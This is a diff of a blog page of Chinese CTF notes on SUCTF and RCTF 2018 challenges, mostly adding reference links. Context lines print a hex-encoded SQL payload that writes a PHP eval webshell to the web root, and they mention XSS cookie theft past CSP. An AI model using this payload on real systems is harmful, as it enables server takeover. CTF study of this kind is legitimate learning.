@@ -100,7 +100,7 @@
 <meta property="og:url" content="http://Merl1ng.com/2018/05/28/suctfwp/index.html">
 <meta property="og:site_name" content="Merl1ng's blog">
 <meta property="og:description" content="周末做了点su rctf的当时没看 整理下">
-<meta property="og:updated_time" content="2018-05-31T14:20:15.855Z">
+<meta property="og:updated_time" content="2018-06-22T13:26:07.998Z">
 <meta name="twitter:card" content="summary">
 <meta name="twitter:title" content="suctfwp">
 <meta name="twitter:description" content="周末做了点su rctf的当时没看 整理下">
@@ -332,11 +332,14 @@
       
         <p>周末做了点su rctf的当时没看 整理下</p>
 <a id="more"></a>
-<h2 id="suctf"><a href="#suctf" class="headerlink" title="suctf"></a>suctf</h2><h3 id="web1"><a href="#web1" class="headerlink" title="web1"></a>web1</h3><p>php匿名函数</p>
+<h2 id="suctf"><a href="#suctf" class="headerlink" title="suctf"></a>suctf</h2><p><a href="http://bendawang.site/2018/05/28/SUCTF-2018-%E9%83%A8%E5%88%86%E9%A2%98%E8%A7%A3/" target="_blank" rel="external">http://bendawang.site/2018/05/28/SUCTF-2018-%E9%83%A8%E5%88%86%E9%A2%98%E8%A7%A3/</a></p>
+<p><a href="https://findneo.tech/180527suctf" target="_blank" rel="external">https://findneo.tech/180527suctf</a></p>
+<h3 id="web1"><a href="#web1" class="headerlink" title="web1"></a>web1</h3><p>php匿名函数</p>
 <p><a href="https://www.jianshu.com/p/19e3ee990cb7" target="_blank" rel="external">https://www.jianshu.com/p/19e3ee990cb7</a></p>
 <p>hitcon的简化</p>
 <p>除此之外匿名函数还有一个攻击点</p>
 <p><a href="https://paper.seebug.org/94/" target="_blank" rel="external">https://paper.seebug.org/94/</a></p>
+<p>看了bendawanag的wp原来可以直接burp爆破匿名函数末位。。。</p>
 <h3 id="web2"><a href="#web2" class="headerlink" title="web2"></a>web2</h3><p>upload getshell</p>
 <p>无字母数字的方式构造webshell 以前看过ph师傅的文章 比赛时没想起来</p>
 <p>源码给了</p>
@@ -353,6 +356,7 @@
 <p>select 0x3c3f706870206576616c28245f524551554553545b273535333332275d293b3f3e into outfile ‘/var/www/html/favicon/wfox.php’</p>
 <p>再hex编码</p>
 <p>set @num=0x73656c65637420307833633366373036383730323036353736363136633238323435663532343535313535343535333534356232373335333533333333333232373564323933623366336520696e746f206f757466696c6520272f7661722f7777772f68746d6c2f66617669636f6e2f77666f782e70687027;prepare t from @num;execute t;</p>
+<p><a href="http://www.bendawang.site/" target="_blank" rel="external">http://www.bendawang.site/</a><br>大师傅这里也非预期了 直接把shell写到了用户名里面</p>
 <h3 id="homework"><a href="#homework" class="headerlink" title="homework"></a>homework</h3><p>挺难的 但其实部分也没有超出知识体系 xxe和sql没想起来不应该</p>
 <h3 id="misc0"><a href="#misc0" class="headerlink" title="misc0"></a>misc0</h3><p>base32 转ascii</p>
 <h3 id="misc1"><a href="#misc1" class="headerlink" title="misc1"></a>misc1</h3><p>x%a1=b1<br>……<br>x%a2=b20</p>
@@ -364,6 +368,8 @@
 <p>最后得到一串贼长的 转16进制再转ascii码</p>
 <h2 id="rctf2018"><a href="#rctf2018" class="headerlink" title="rctf2018"></a>rctf2018</h2><p><a href="https://xz.aliyun.com/t/2347" target="_blank" rel="external">https://xz.aliyun.com/t/2347</a></p>
 <p><a href="https://lorexxar.cn/2018/05/23/rctf2018/#r-cursive" target="_blank" rel="external">https://lorexxar.cn/2018/05/23/rctf2018/#r-cursive</a></p>
+<p><a href="https://blog.csdn.net/Jerryzhu369/article/details/80432848" target="_blank" rel="external">https://blog.csdn.net/Jerryzhu369/article/details/80432848</a></p>
+<p><a href="https://www.anquanke.com/post/id/145885" target="_blank" rel="external">https://www.anquanke.com/post/id/145885</a></p>
 <h3 id="web-amp"><a href="#web-amp" class="headerlink" title="web  amp"></a>web  amp</h3><p>cookie提示flag在admin的cookie 应该是xss</p>
 <p>猜测使用AMP特性绕过csp打到cookie</p>
 <p><a href="https://github.com/ampproject/amphtml/blob/master/spec/amp-var-substitutions.md#client-id" target="_blank" rel="external">https://github.com/ampproject/amphtml/blob/master/spec/amp-var-substitutions.md#client-id</a></p>
@@ -408,6 +414,10 @@
       
         <div class="post-nav">
           <div class="post-nav-next post-nav-item">
+            
+              <a href="/2018/06/22/sctfwp/" rel="next" title="sctfwp">
+                <i class="fa fa-chevron-left"></i> sctfwp
+              </a>
             
           </div>
 
@@ -490,7 +500,7 @@
           
             <div class="site-state-item site-state-posts">
               <a href="/archives/">
-                <span class="site-state-item-count">53</span>
+                <span class="site-state-item-count">54</span>
                 <span class="site-state-item-name">posts</span>
               </a>
             </div>
